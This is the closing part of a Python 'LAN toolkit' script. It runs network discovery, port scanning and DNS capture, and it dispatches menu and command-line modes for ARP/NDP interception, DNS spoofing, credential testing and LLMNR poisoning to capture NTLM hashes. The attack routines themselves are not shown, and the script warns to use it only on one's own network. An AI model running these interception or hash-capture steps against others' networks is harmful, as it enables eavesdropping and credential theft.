  8) Responder - capture Windows auth hashes  (your own network only)
  9) CVE lookup - precise, by CPE (version-exact)
  q) Quit
"""


BAR = "=" * 64


def section(title):
    print(f"\n{title}")
    print("-" * 64)


def auto_report(net):
    """Run every step on its own, print a clean report, and exit. No prompts."""
    stamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(BAR)
    print(f"  LAN NETWORK REPORT{' ' * 24}{time.strftime('%Y-%m-%d %H:%M')}")
    print(f"  This PC: {net['ip']}     Router: {net['gateway']}")
    print(BAR)

    # --- [1] Discover devices ---
    section("[1] DEVICES ON THE NETWORK")
    print("  Scanning 254 addresses ...\n")
    rows = discover_devices(net)
    print_devices(rows, indent="  ")

    # --- [2] Port scan every device (compact, one line each) ---
    section("[2] OPEN PORTS  (common-port scan of each device)")
    for ip, mac, name, priv, note in rows:
        if mac == "(this pc)":
            print(f"  {ip:<16}{'THIS PC':<12}(skipped)")
            continue
        ports = scan_common(ip)
        label = note or ("device")
        if ports:
            desc = "  ".join(f"{p}({port_name(p)})" for p in ports)
        else:
            desc = "- none open (client device)"
        print(f"  {ip:<16}{label:<12}{desc}")

    # --- [3] DNS traffic (10s live capture) ---
    section("[3] DNS TRAFFIC  (10s live capture - domains looked up now)")
    tshark = find_tshark()
    iface = wifi_interface(tshark) if tshark else None
    if not tshark:
        print("  tshark not found - skipping (install Wireshark to enable).")
    elif not iface:
        print("  No Wi-Fi capture interface found - skipping.")
    else:
        try:
            seen = _dns_capture(tshark, iface, 10)
            if seen:
                for src, dom in seen:
                    print(f"  {src:<16}-> {dom}")
            else:
                print("  (no DNS lookups during this 10s window - try while browsing)")
        except Exception as e:
            print(f"  capture skipped ({e})")

    # --- [4] Remote access snapshot ---
    section("[4] REMOTE ACCESS  (this PC)")
    ssh, rdp = _remote_host_snapshot()
    print(f"  SSH client : {'yes' if ssh else 'no'}")
    if rdp is not None:
        print(f"  RDP host   : {'enabled' if rdp else 'disabled'}"
              f"  (Windows Home cannot host RDP)")
    listening = _listening_ports()
    print(f"  Listening  : {', '.join(listening) if listening else 'none (pure client)'}")
    print(f"  Router UI  : http://{net['gateway']}")

    # --- [5] Baseline check (new / unknown devices) ---
    section("[5] BASELINE CHECK  (new devices since last run)")
    base_path = os.path.join(HOME, "Downloads", "lan-known-devices.json")
    known = _load_json(base_path) or {}
    current = {mac: ip for ip, mac, *_ in rows if mac != "(this pc)"}
    new = [m for m in current if m not in known]
    if not known:
        print("  First run - saved current devices as the baseline.")
    elif new:
        print(f"  *** {len(new)} NEW / UNKNOWN device(s): ***")
        for m in new:
            print(f"      {current[m]:<16}{m}")
        print("  Investigate with:  python lan-toolkit.py --menu  (option 2)")
    else:
        print("  All devices match the baseline. Nothing new.")
    for ip, mac, name, *_ in rows:
        if mac != "(this pc)" and mac not in known:
            known[mac] = {"name": name, "ip": ip, "first_seen": stamp}
    _save_json(base_path, known)

    print(f"\n{BAR}")
    print(f"  Report complete.   (menu mode:  python lan-toolkit.py --menu)")
    print(BAR)


def run_menu(net):
    print("================ LAN Toolkit (Python) ================")
    print(f" This machine: {net['ip']}   Router: {net['gateway']}")
    print("======================================================")
    actions = {
        "1": step_discover, "2": step_portscan, "3": step_traffic,
        "4": step_remote, "5": step_intercept,
        "6": step_dnsspoof, "7": step_credtest, "8": step_responder,
        "9": step_cvelookup,
    }
    while True:
        try:
            print(MENU)
            choice = input("Choose: ").strip().lower()
            if choice == "q":
                break
            action = actions.get(choice)
            if action:
                try:
                    action(net)
                except Exception as e:
                    print(f"Error: {e}")
                input("\n[Enter] to return to the menu ...")   # keep results on screen
            else:
                print("Pick 1-9 or q.")
        except KeyboardInterrupt:
            print("\nInterrupted - back to menu. (q to quit)")


def _pick_device(net, ipv6=True):
    """Discover devices and let the user choose one. Returns an IP or None.
    Shared by port scan (IPv4 only) and intercept (IPv4 + IPv6)."""
    print("\nDiscovering devices ...")
    cands = []
    for ip, mac, name, priv, note in discover_devices(net):
        if mac != "(this pc)" and ip != net["gateway"]:
            cands.append((ip, mac, name, "IPv4"))
    if ipv6:
        for ip6, mac in _ipv6_neighbors():
            cands.append((ip6, mac, "(IPv6 neighbor)", "IPv6"))
    if not cands:
        print("  No candidate devices found."); return None
    print("\nSelect a device (YOUR OWN devices only):")
    for idx, (ip, mac, name, fam) in enumerate(cands, 1):
        tag = f"[{fam}] " if ipv6 else ""
        print(f"  {idx}) {tag}{ip:<34} {mac:<18} {name}")
    choice = input("Number (blank to cancel): ").strip()
    if not choice.isdigit() or not (1 <= int(choice) <= len(cands)):
        print("  Cancelled."); return None
    return cands[int(choice) - 1][0]


def _is_admin():
    try:
        if IS_WIN:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return os.geteuid() == 0
    except Exception:
        return False


def _relaunch_elevated(extra_args):
    """Re-run THIS script with root/admin. Windows: UAC in a new window.
    mac/Linux: sudo in the same terminal (prompts for password, then returns).
    Returns True if the elevated run was launched."""
    script = os.path.abspath(__file__)
    try:
        if IS_WIN:
            import ctypes
            params = f'"{script}" ' + " ".join(extra_args)
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
        else:
            subprocess.run(["sudo", sys.executable, script] + extra_args)
        return True
    except Exception as e:
        print(f"  Could not elevate ({e}). Run manually:")
        print(f"    sudo {sys.executable} {script} {' '.join(extra_args)}")
        return False


HELP = """lan-toolkit.py - home network tinkering toolkit (your own network only)

USAGE
  python lan-toolkit.py [mode]

MODES
  (no args)        Auto report: discover + scan + traffic + remote + baseline, then exit
  --menu, -m       Interactive menu (pick steps 1-5 one at a time)
  --arp  [ip]      Intercept an IPv4 device (ARP). No ip = pick from a list. Needs admin.
  --ndp  [ipv6]    Intercept an IPv6 device (NDP). No addr = pick from a list. Needs admin.
  --help, -h       Show this help

NOTES
  * Interception is for devices on a network YOU OWN. Don't use it elsewhere.
  * Outputs are written to your Downloads folder (lan-report / arp-sni / ndp-sni /
    lan-known-devices).
  * The intercept auto-elevates (one UAC prompt) when run without admin.
"""


def print_help():
    print(HELP)


def main():
    args = [a.lower() for a in sys.argv[1:]]

    if "--help" in args or "-h" in args:
        print_help()
        return

    net = get_net()

    # --arp [ip] : run the ARP intercept. With an IP it runs non-interactively;
    # without one, it lists devices and lets you pick. (Needs an admin shell.)
    if "--arp" in args:
        i = args.index("--arp")
        nxt = args[i + 1] if i + 1 < len(args) else None
        target = nxt if (nxt and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", nxt)) else None
        if target is None:
            target = _pick_device(net, ipv6=False)
        if target:
            step_arp(net, target)
        return

    # --ndp [ipv6] : IPv6 NDP/RA intercept. With an address it runs directly;
    # without one, it lists IPv6 neighbors to pick. (Needs an admin shell.)
    if "--ndp" in args:
        i = args.index("--ndp")
        nxt = args[i + 1] if i + 1 < len(args) else None
        target = nxt if (nxt and ":" in nxt) else None
        step_ndp(net, target)
        return

    # --responder : LLMNR/NBT-NS/mDNS poisoning + NTLM capture (elevation relaunch)
    if "--responder" in args:
        step_responder(net)
        return

    # --dnsspoof <ip> [domain] [redirect-ip] : DNS spoof a device. With domain
    # + redirect it runs non-interactively (used by the elevation relaunch).
    if "--dnsspoof" in args:
        i = args.index("--dnsspoof")
        rest = args[i + 1:]
        target = rest[0] if rest and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", rest[0]) else None
        domain = rest[1] if len(rest) > 1 else None
        redirect = rest[2] if len(rest) > 2 else None
        step_dnsspoof(net, target, domain, redirect)
        return

    # Default = automatic full report. Use --menu / -m for the interactive menu.
    if "--menu" in args or "-m" in args:
        run_menu(net)
    else:
        auto_report(net)


if __name__ == "__main__":
    main()
